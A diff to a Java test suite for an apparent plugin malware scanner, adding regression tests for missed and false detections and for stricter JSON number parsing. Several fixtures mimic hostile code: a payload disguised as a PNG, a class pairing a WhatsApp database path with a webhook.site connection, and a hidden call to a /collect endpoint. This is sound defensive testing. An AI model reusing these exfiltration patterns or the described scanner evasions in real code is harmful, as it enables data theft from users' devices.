@@ -49,6 +49,7 @@ public final class ScannerTest {
         manifestProblems(fixtures);
         trustDecisions(fixtures);
         reportRendering(fixtures);
+        regressions(fixtures);
 
         System.out.println();
         System.out.println(passed + " checks passed, " + failures.size() + " failed");
@@ -454,6 +455,195 @@ public final class ScannerTest {
                 starved.truncated() && starved.hasRule("SCN001"), summarise(starved));
     }
 
+
+    // ------------------------------------------------------------- regressions
+
+    /**
+     * Cases that were once wrong.
+     *
+     * <p>Each of these is a defect found by review after the scanner was first written. They are kept
+     * as tests rather than just fixed, because a scanner that silently stops catching something is
+     * worse than one that never caught it: the report still looks reassuring.
+     */
+    private static void regressions(Fixtures fixtures) {
+        String benign = "package demo;\npublic class A { public int n() { return 1; } }\n";
+
+        // A payload renamed to .png used to escape every rule: the content check exempted image
+        // extensions, the string scan skipped them, and so did the entropy check.
+        Map<String, byte[]> disguisedImage = new LinkedHashMap<String, byte[]>();
+        disguisedImage.put("manifest.json", Fixtures.bytes(Fixtures.manifest("x.png", "Png", "demo.A")));
+        disguisedImage.put("src/demo/A.java", Fixtures.bytes(benign));
+        disguisedImage.put("assets/banner.png", Fixtures.fakeDex(40 * 1024));
+        ScanReport disguised = scan(fixtures.rawArchive("disguised-png.mtp", disguisedImage, false));
+        check("a payload renamed to .png is still caught",
+                disguised.hasRule("ARC003") && disguised.verdict() != Verdict.CLEAN,
+                disguised.verdict() + " :: " + summarise(disguised));
+
+        // ...while a genuine PNG must stay quiet, or the fix would just be noise.
+        Map<String, byte[]> realImage = new LinkedHashMap<String, byte[]>();
+        realImage.put("manifest.json", Fixtures.bytes(Fixtures.manifest("x.realpng", "Real", "demo.A")));
+        realImage.put("src/demo/A.java", Fixtures.bytes(benign));
+        realImage.put("assets/icon.png", Fixtures.fakePng(8 * 1024));
+        ScanReport realImageReport = scan(fixtures.rawArchive("real-png.mtp", realImage, false));
+        check("a genuine PNG is not reported as a payload",
+                !realImageReport.hasRule("ARC003") && realImageReport.verdict() == Verdict.CLEAN,
+                realImageReport.verdict() + " :: " + summarise(realImageReport));
+
+        // Reads used to reserve the caller's ceiling rather than the member's size, so a plugin of
+        // small files exhausted a 16 MB budget after sixteen of them.
+        Map<String, String> many = new LinkedHashMap<String, String>();
+        for (int i = 0; i < 25; i++) {
+            many.put("src/demo/C" + i + ".java", "package demo;\npublic class C" + i + " {}\n");
+        }
+        File manyFiles = fixtures.directoryPlugin("many-small-files",
+                Fixtures.manifest("demo.many", "Many", "demo.C0"), many);
+        ScanReport manyReport = new PluginScanner(IocDatabase.empty())
+                .scan(manyFiles, new ScanBudget(60000L, 16L * 1024 * 1024));
+        check("small files do not exhaust the byte budget",
+                manyReport.filesScanned() >= 25 && !manyReport.truncated(),
+                "scanned " + manyReport.filesScanned() + ", truncated=" + manyReport.truncated());
+
+        // scanAll shared one budget, so a large first package left later ones unscanned but still
+        // reported as if they had been examined.
+        Map<String, String> bulky = new LinkedHashMap<String, String>();
+        StringBuilder filler = new StringBuilder("package demo;\npublic class B {\n");
+        for (int i = 0; i < 400; i++) {
+            filler.append("  // padding padding padding padding padding padding padding\n");
+        }
+        filler.append("}\n");
+        for (int i = 0; i < 20; i++) {
+            bulky.put("src/demo/B" + i + ".java", filler.toString().replace("class B ", "class B" + i + " "));
+        }
+        File bulkyPlugin = fixtures.directoryPlugin("bulky",
+                Fixtures.manifest("demo.bulky", "Bulky", "demo.B0"), bulky);
+        File hostile = fixtures.directoryPlugin("later-hostile",
+                Fixtures.manifest("demo.later", "Later", "demo.S"),
+                Fixtures.sources("src/demo/S.java",
+                        "package demo;\npublic class S { String u = \"https://api.telegram.org/bot1/x\"; }\n"));
+        List<File> pair = new ArrayList<File>();
+        pair.add(bulkyPlugin);
+        pair.add(hostile);
+        List<ScanReport> both = new PluginScanner(IocDatabase.empty())
+                .scanAll(pair, new ScanBudget(30000L, 200L * 1024));
+        check("one large plugin does not starve the rest of the scan",
+                both.get(1).hasRule("NET003"), summarise(both.get(1)));
+
+        // An exhausted budget reported "No manifest.json" about a package whose manifest was present.
+        File ordinary = fixtures.directoryPlugin("budget-denied",
+                Fixtures.manifest("demo.budget", "Budget", "demo.A"),
+                Fixtures.sources("src/demo/A.java", benign));
+        ScanReport starved = new PluginScanner(IocDatabase.empty()).scan(ordinary, new ScanBudget(0L, 0L));
+        check("an unread manifest is not reported as a missing one",
+                !starved.hasRule("MFT001"), summarise(starved));
+
+        // The translation-engine excuse came from the string appearing anywhere, so a comment
+        // switched off a plugin's own network scoring.
+        String fakeEngine = ""
+                + "package demo;\n"
+                + "// TranslationEngine\n"
+                + "public class F {\n"
+                + "  public void f() throws Exception {\n"
+                + "    new java.net.URL(\"http://198.51.100.7/collect\").openConnection();\n"
+                + "  }\n"
+                + "}\n";
+        ScanReport fakeReport = scan(fixtures.directoryPlugin("fake-engine",
+                Fixtures.manifest("demo.fake", "Fake", "demo.F"),
+                Fixtures.sources("src/demo/F.java", fakeEngine)));
+        check("a comment cannot claim the translation-engine excuse",
+                !fakeReport.hasRule("CTX001") && !fakeReport.traits.contains("translation-engine"),
+                fakeReport.traits + " :: " + summarise(fakeReport));
+
+        // Rescoring a report duplicated every derived combination finding and its weight.
+        File exfilA = fixtures.directoryPlugin("idempotent-a",
+                Fixtures.manifest("com.dup.tools", "Dup Tools", "demo.E"),
+                Fixtures.sources("src/demo/E.java", ""
+                        + "package demo;\n"
+                        + "public class E {\n"
+                        + "  String p = \"/data/data/com.whatsapp/databases\";\n"
+                        + "  void f() throws Exception {"
+                        + " new java.net.URL(\"https://webhook.site/z\").openConnection(); }\n"
+                        + "}\n"));
+        File exfilB = fixtures.directoryPlugin("idempotent-b",
+                Fixtures.manifest("com.dup.tool", "Dup Tool", "demo.E"),
+                Fixtures.sources("src/demo/E.java", "package demo;\npublic class E {}\n"));
+        ScanReport alone = scan(exfilA);
+        int aloneCount = countRule(alone, "CMB101");
+        List<File> lookalikePair = new ArrayList<File>();
+        lookalikePair.add(exfilA);
+        lookalikePair.add(exfilB);
+        List<ScanReport> rescored = new PluginScanner(IocDatabase.empty())
+                .scanAll(lookalikePair, ScanBudget.unlimited());
+        check("rescoring does not duplicate derived findings",
+                aloneCount == 1 && countRule(rescored.get(0), "CMB101") == 1,
+                "alone=" + aloneCount + " rescored=" + countRule(rescored.get(0), "CMB101")
+                        + " score=" + rescored.get(0).score());
+
+        // OBF008 matched `int i`, so ordinary for-loops read as obfuscation.
+        StringBuilder loops = new StringBuilder("package demo;\npublic class L {\n  void f() {\n");
+        for (int i = 0; i < 14; i++) {
+            loops.append("    for (int i = 0; i < 3; i++) { System.out.print(i); }\n");
+        }
+        loops.append("  }\n}\n");
+        ScanReport loopReport = scan(fixtures.directoryPlugin("loops",
+                Fixtures.manifest("demo.loops", "Loops", "demo.L"),
+                Fixtures.sources("src/demo/L.java", loops.toString())));
+        check("ordinary for-loops are not reported as obfuscation",
+                !loopReport.hasRule("OBF008"), summarise(loopReport));
+
+        // "unofficial" contains "official", and was reported as a claim of official status.
+        String honest = Fixtures.manifest("demo.honest", "Community Build", "demo.A")
+                .replace("\"fixture\"", "\"An unofficial community build.\"");
+        ScanReport honestReport = scan(fixtures.directoryPlugin("unofficial", honest,
+                Fixtures.sources("src/demo/A.java", benign)));
+        check("saying unofficial is not a claim of being official",
+                !honestReport.hasRule("MFT008"), summarise(honestReport));
+
+        String boastful = Fixtures.manifest("demo.boast", "Official Toolkit", "demo.A");
+        ScanReport boastfulReport = scan(fixtures.directoryPlugin("official", boastful,
+                Fixtures.sources("src/demo/A.java", benign)));
+        check("claiming to be official is still reported",
+                boastfulReport.hasRule("MFT008"), summarise(boastfulReport));
+
+        // Two packages claiming one identity were skipped entirely, the strongest case of all.
+        File cloneA = fixtures.directoryPlugin("clone-a",
+                Fixtures.manifest("com.clone.tools", "Clone Tools", "demo.A"),
+                Fixtures.sources("src/demo/A.java", benign));
+        File cloneB = fixtures.directoryPlugin("clone-b",
+                Fixtures.manifest("com.clone.tools", "Clone Tools", "demo.A"),
+                Fixtures.sources("src/demo/A.java", benign));
+        List<File> clones = new ArrayList<File>();
+        clones.add(cloneA);
+        clones.add(cloneB);
+        List<ScanReport> cloneReports = new PluginScanner(IocDatabase.empty())
+                .scanAll(clones, ScanBudget.unlimited());
+        check("two plugins claiming the same identity are both flagged",
+                cloneReports.get(0).hasRule("MFT011") && cloneReports.get(1).hasRule("MFT011"),
+                summarise(cloneReports.get(0)) + " / " + summarise(cloneReports.get(1)));
+
+        // A failed save was reported to the user as a stored trust decision.
+        try {
+            File blocker = new File(fixtures.root(), "not-a-directory");
+            Fixtures.write(blocker, "x");
+            IocDatabase db = IocDatabase.empty();
+            db.trust("abc", "note");
+            db.save(new File(blocker, "indicators.json"));
+            check("a failed save is reported, not swallowed", false, "save() returned normally");
+        } catch (java.io.IOException expected) {
+            check("a failed save is reported, not swallowed", true, "IOException raised");
+        }
+    }
+
+    private static int countRule(ScanReport report, String ruleId) {
+        int count = 0;
+        List<mt.safety.scanner.core.Signal> signals = report.signals;
+        for (int i = 0; i < signals.size(); i++) {
+            if (signals.get(i).ruleId.equals(ruleId)) {
+                count++;
+            }
+        }
+        return count;
+    }
+
     // ----------------------------------------------------------- unit checks
 
     private static void jsonTests() throws Exception {
@@ -466,6 +656,14 @@ public final class ScannerTest {
                 Json.str(escapes, "k", ""));
 
         check("JSON rejects trailing junk", !parses("{\"a\":1} trailing"), "should have been rejected");
+        check("JSON rejects a leading plus on a number", !parses("{\"a\": +1}"),
+                "should have been rejected");
+        check("JSON rejects other malformed numbers",
+                !parses("{\"a\": 01}") && !parses("{\"a\": 1.}") && !parses("{\"a\": .5}")
+                        && !parses("{\"a\": 1e}") && !parses("{\"a\": 1-2}"),
+                "should have been rejected");
+        check("JSON still accepts well-formed numbers",
+                parses("{\"a\": -1.5e-3, \"b\": 0, \"c\": 12}"), "should have parsed");
         check("JSON rejects unterminated input", !parses("{\"a\": "), "should have been rejected");
 
         StringBuilder deep = new StringBuilder();
